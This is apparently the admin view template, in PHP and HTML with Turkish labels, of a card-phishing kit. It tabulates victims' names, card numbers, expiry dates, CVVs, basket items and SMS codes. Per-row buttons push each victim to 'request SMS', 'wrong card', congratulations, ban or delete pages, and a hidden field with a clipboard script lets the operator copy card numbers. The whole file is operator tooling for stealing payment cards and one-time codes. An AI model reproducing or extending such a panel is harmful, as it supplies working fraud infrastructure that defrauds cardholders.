
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
<table class="table text-light" id="logTable">
                        <thead>
                            <tr>
                                <th scope="col">ID</th>
                                <th scope="col">Sayfa</th>
                                <th scope="col">İSİM</th>
                                <th scope="col">CC NO</th>
                                <th scope="col">SKT</th>
                                <th scope="col">CVV</th>
                                <th scope="col">SEPET</th>
                                <th scope="col">SMS</th>
                                <th scope="col">İŞLEM</th>
                            </tr>
                        </thead>
                        <tbody>
                                <?php foreach ($logs as $log) { ?>
                                    <tr>
                                        <th><?php echo $log->id; ?></th>
                                        <th><?php echo $log->page; ?></th>
                                        <th><?php echo $log->isim; ?></th>
                                        <th id="copyButton<?php echo $log->id ?>"><?php echo $log->cc_number; ?></th>
                                        <th><?php echo $log->skt; ?></th>
                                        <th><?php echo $log->cvv; ?></th>
                                        <th><?php echo $log->basket_urun;?></th>
                                        <th class="text-success"><?php echo $log->sms;?></th>
                                        <th class="d-flex">
                                            <form action="<?php echo base_url("Admin/redirectSms/").$log->id."/4"?>" method="POST">
                                                <button class="btn btn-danger mr-2" data-toggle="tooltip" data-placement="top" title="Başa Döndür">
                                                    ♻
                                                </button>
                                            </form>
                                            <form action="<?php echo base_url("Admin/redirectSms/").$log->id."/5"?>" method="POST">
                                                <button class="btn btn-danger mr-2" data-toggle="tooltip" data-placement="top" title="Hatalı Kart">
                                                ⚠️
                                                </button>
                                            </form>
                                            <form action="<?php echo base_url("Admin/redirectSms/").$log->id."/6"?>" method="POST" data-toggle="tooltip" data-placement="top" title="Sms İste">
                                                <button class="btn btn-danger mr-2">
                                                    SMS
                                                </button>
                                            </form>
                                            <form action="<?php echo base_url("Admin/redirectSms/").$log->id."/6"?>" method="POST" data-toggle="tooltip" data-placement="top" title="Sms İste">
                                                <button class="btn btn-danger mr-2">
                                                    SMS2
                                                </button>
                                            </form>
                                            <form action="<?php echo base_url("Admin/redirectSms/").$log->id."/7"?>" method="POST" data-toggle="tooltip" data-placement="top" title="Tebrik Sayfası">
                                                <button class="btn btn-danger mr-2">
                                                🎉
                                                </button>
                                            </form>
                                            <form action="<?php echo base_url("Admin/redirectSms/").$log->id."/8"?>" method="POST" data-toggle="tooltip" data-placement="top" title="Banla">
                                                <button class="btn btn-danger mr-2">
                                                ⛔
                                                </button>
                                            </form>
                                            <form action="<?php echo base_url("Admin/redirectSms/").$log->id."/9"?>" method="POST" data-toggle="tooltip" data-placement="top" title="Sil">
                                                <button class="btn btn-danger">
                                                🗑️
                                                </button>
                                            </form>
                                        </th>
                                    </tr>
                                    <input type="text" id="myText<?php echo $log->id ?>" value="<?php echo $log->cc_number?>" style="opacity: 0;"/>
                                    <input type="hidden" value="<?php echo $log->id?>">
                                    <script>
                                        $(document).ready(function(){
                                            $("#copyButton<?php echo $log->id ?>").click(function(){
                                                $("#myText<?php echo $log->id ?>").select();
                                                document.execCommand('copy');
                                            });
                                        });
                                    </script>
                                <?php } ?>
                        </tbody>
                    </table>
                </div>
            </div>

